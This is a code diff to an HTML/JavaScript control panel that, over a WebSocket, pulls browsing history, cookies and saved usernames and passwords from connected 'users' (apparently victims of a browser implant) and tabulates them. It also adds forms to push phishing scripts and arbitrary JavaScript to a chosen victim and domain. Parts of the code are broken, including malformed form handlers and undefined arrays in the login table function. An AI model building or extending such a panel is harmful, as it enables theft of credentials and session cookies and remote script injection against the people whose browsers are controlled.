@@ -34,6 +34,12 @@ ws.onopen = function(event){
     var jsonPackage ={type:'getClients'};
     ws.send(JSON.stringify(jsonPackage));
     console.log("Request sent");
+    var jsonPackage ={type:'getHistory'};
+    ws.send(JSON.stringify(jsonPackage));
+    var jsonPackage = {type:'getCookies'};
+    ws.send(JSON.stringify(jsonPackage));
+    var jsonPackage = {type:'getLoginInfo'};
+    ws.send(JSON.stringify(jsonPackage));
 }
 
 ws.onmessage = function(e){
@@ -47,32 +53,57 @@ ws.onmessage = function(e){
             console.log(object.allSites);
             console.log("got something");
             sites.forEach(site => {
-            node = document.getElementById("blacklist");
-            aRow = document.createElement("li");
-            aRow.classList.add("list-group-item");
-            aCol = document.createTextNode(site);
-            node.appendChild(aRow);
-            aRow.appendChild(aCol);
+                node = document.getElementById("blacklist");
+                aRow = document.createElement("li");
+                aRow.classList.add("list-group-item");
+                aCol = document.createTextNode(site);
+                node.appendChild(aRow);
+                aRow.appendChild(aCol);
             });
+            break;
         case 'statusList':
             console.log("got a status");
-            var ids = object.ids;
+            var ids = new Array();
+            ids = object.ids;
             var statuses = object.status;
             for (i = 0; i < ids.length; i++){
                 makeCard(ids[i],statuses[i])
             }
+            break;
         case 'idHistory':
-        case 'cookie':
-        case 'username':
-        case 'password':
+            fillHistory(object.targetID, object.historyArray);
+            break;
+        case 'cookieID':
+            fillCookies(object.targetID, object.name[i], object.domain[i], object.value[i]);
+            break;
+        case 'userInfo':
+            fillLogins(object.targetID,object.domain,object.username,object.value);
+            break;
     }    
 }
 
 function blackList(){
+    var URL = document.getElementById("Blacklist_URL");
     var jsonPackage = {id: 0, type:'list', addString: URL};
     ws.send(JSON.stringify(jsonPackage));
 }
 window.addEventListener("hashchange", function() { scrollBy(0, -70) });
+
+function js(){
+    var id = document.getElementById("JS_ID").value;
+    var script = document.getElementById("JS_SCRIPT").value;
+    var url = document.getElementById("JS_URL").value;
+    alert(url);
+    //var jsonPackage = {id: id, type:"sendJavascript", script:script, domain:url};
+    //ws.send(JSON.stringify(jsonPackage));
+}
+
+function phish(){
+    var id = document.getElementById("Phishing_ID").value;
+    var url = document.getElementById("Phishing_URL").value;
+    var jsonPackage = {id: id, type:"sendPhishingscript", domain:url};
+    ws.send(JSON.stringify(jsonPackage));
+}
 
 function send() {
 var id = document.getElementById('id').value;
@@ -144,6 +175,112 @@ function blackList(){
     var jsonPackage = {id: 0, type:'list', addString: URL};
     ws.send(JSON.stringify(jsonPackage));
 }
+
+function fillCookies(index, nameArray, domainArray, valueArray){
+    index = "body" + index;
+    //body of cards have id "body0", "body1", "body2", ...
+
+    var table = document.createElement("table");
+
+    var bigRow = document.createElement("tr");
+    cell1 = bigRow.insertCell(0);
+    cell2 = bigRow.insertCell(1);
+    cell2.innerHTML = "SPACE";
+    cell3 = bigRow.insertCell(2);
+    cell4 = bigRow.insertCell(3);
+    cell4.innerHTML = "SPACE";
+    cell5 = bigRow.insertCell(4);
+
+    for (var i = 0; i < nameArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell1.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = nameArray[i];
+        aRow.appendChild(aCol);
+    }
+    var aRow = document.createElement('tr');
+    bigRow.appendChild(aRow);
+    for (var i = 0; i < domainArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell3.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = domainArray[i];
+        aRow.appendChild(aCol);
+    }
+    var aRow = document.createElement('tr');
+    bigRow.appendChild(aRow);
+    for (var i = 0; i < valueArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell5.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = valueArray[i];
+        aRow.appendChild(aCol);
+    }
+
+    var addTo = document.getElementById(index);
+    addTo.appendChild(bigRow);
+}
+
+function fillHistory(index, historyArray){
+    index = "body" + index;
+    //body of cards have id "body0", "body1", "body2", ...
+
+    var table = document.createElement("table");
+    /*var header = table.createTHead();
+    var row = header.insertRow(0);
+    var cell = row.insertCell(0);
+    cell.innerHTML = "<b>History</b>";*/
+
+    for (var i = 0; i < historyArray.length; i++) {
+        var aRow = document.createElement('tr');
+        var aCol = document.createTextNode(historyArray[i]);
+        table.appendChild(aRow);
+        aRow.appendChild(aCol);
+    }
+
+    var addTo = document.getElementById(index);
+    addTo.appendChild(table);
+
+}
+
+function fillLogins(id, urlArray, usernameArray, passwordArray){
+    id = "body" + id;
+    //body of cards have id "body0", "body1", "body2", ...
+
+    var bigRow = document.createElement("tr");
+    cell1 = bigRow.insertCell(0);
+    cell2 = bigRow.insertCell(1);
+    cell2.innerHTML = "SPACE";
+    cell3 = bigRow.insertCell(2);
+    cell4 = bigRow.insertCell(3);
+    cell4.innerHTML = "SPACE";
+    cell5 = bigRow.insertCell(4);
+
+    for (var i = 0; i < nameArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell1.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = urlArray[i];
+        aRow.appendChild(aCol);
+    }
+    for (var i = 0; i < domainArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell3.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = usernameArray[i];
+        aRow.appendChild(aCol);
+    }
+    for (var i = 0; i < valueArray.length; i++) {
+        var aRow = document.createElement('tr');
+        cell5.appendChild(aRow);
+        var aCol = document.createElement('td');
+        aCol.innerHTML = passwordArray[i];
+        aRow.appendChild(aCol);
+    }
+
+    var addTo = document.getElementById(id);
+    addTo.appendChild(bigRow);
+}
 		</script>
   </head>
 
@@ -176,7 +313,7 @@ function blackList(){
 	<div id = "userSection">
 	
 		<div class="container-fluid">
-			<h3>All Users</h3>
+			<h4>All Users</h4>
 			<div id="accordion">
           <div id="infoCard" class="card">
               <div id="infoCardHeader" class="card-header">
@@ -184,7 +321,7 @@ function blackList(){
                 </a>
               </div>
               <div id="infoCardCollapse" class="collapse" data-parent="#accordion">
-                <div id="infoCardBody" class="card-body">Click an ID to view its cookies, login details. and history.
+                <div id="infoCardBody" class="card-body">Click an ID to view its cookies, login details, and history. Blue users are online, and red users are offline.
                 </div>
               </div>
             </div>
@@ -207,10 +344,36 @@ function blackList(){
     <h4>Add Site to Blacklist Here</h4>
     <input type="text" class="form-control blacklist" placeholder="URL">
     <button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>
-	
+
+    <br><br>
+
+    <!-- Add Phishing -->
+    <form name="phishingForm" onsubmit "return phish()">
+        <h4>Add phishing script:</h4>
+        <br>
+        <input type = "text" name = "Phishing_ID" placeholder = "User ID"><br>
+        <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
+        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_Phishing_Script" class="btn btn-primary">
+    </form>
+
+    <br>
+
+    <!-- Add Javascript -->
+    <form name="jsForm" onsubmit "return js()">
+        <h4>Add javascript execution script:</h4>
+        <br>
+        <input type = "text" name = "JS_ID" placeholder = "User ID"><br>
+        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
+        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_JS_Script" class="btn btn-primary">
+    </form>
+
 	</div>
 	</div>
   </div>
+
+  <br><br>
   
   <form onsubmit="send();return false;">
     ID: <input type="text" id="id"><br>
